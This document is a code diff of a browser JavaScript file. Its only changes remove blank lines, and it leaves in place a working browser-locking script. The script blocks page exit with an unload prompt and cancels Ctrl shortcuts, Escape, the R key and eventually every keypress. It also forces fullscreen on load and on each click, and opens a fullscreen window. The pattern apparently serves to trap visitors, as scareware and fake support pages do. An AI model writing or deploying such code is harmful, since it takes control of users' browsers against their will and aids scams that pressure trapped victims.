@@ -3,7 +3,6 @@ window.onbeforeunload = function (e) {
     e.preventDefault();
     e.returnValue = '';
 };
-
 document.onkeydown = function (e) {
     e = e || window.event;
     if (!e.ctrlKey) return;
@@ -35,7 +34,6 @@ document.onkeydown = function (e) {
             break;
     }
 };
-
 addEventListener("click", function() {
     var
           el = document.documentElement
@@ -46,7 +44,6 @@ addEventListener("click", function() {
     ;
     rfs.call(el);
 });
-
 function launchFullScreen(element) {
 	if(element.requestFullScreen) {
 	  element.requestFullScreen();
@@ -56,26 +53,19 @@ function launchFullScreen(element) {
 	  element.webkitRequestFullScreen();
 	}
   }
-  
   launchFullScreen(document.documentElement);
-
 window.onkeydown = function(x){
     if(x.keyCode === 27){
         x.preventDefault();
     }
 };
-
-
 window.onkeydown = function(r){
     if(r.keyCode === 82){ 
         r.preventDefault();
     }
 };
-
-
 document.onkeydown = function (e) {
 	e.preventDefault();		
 }
-
 window.open ("index.html","","fullscreen=yes");  
 window.open('','_parent','');  
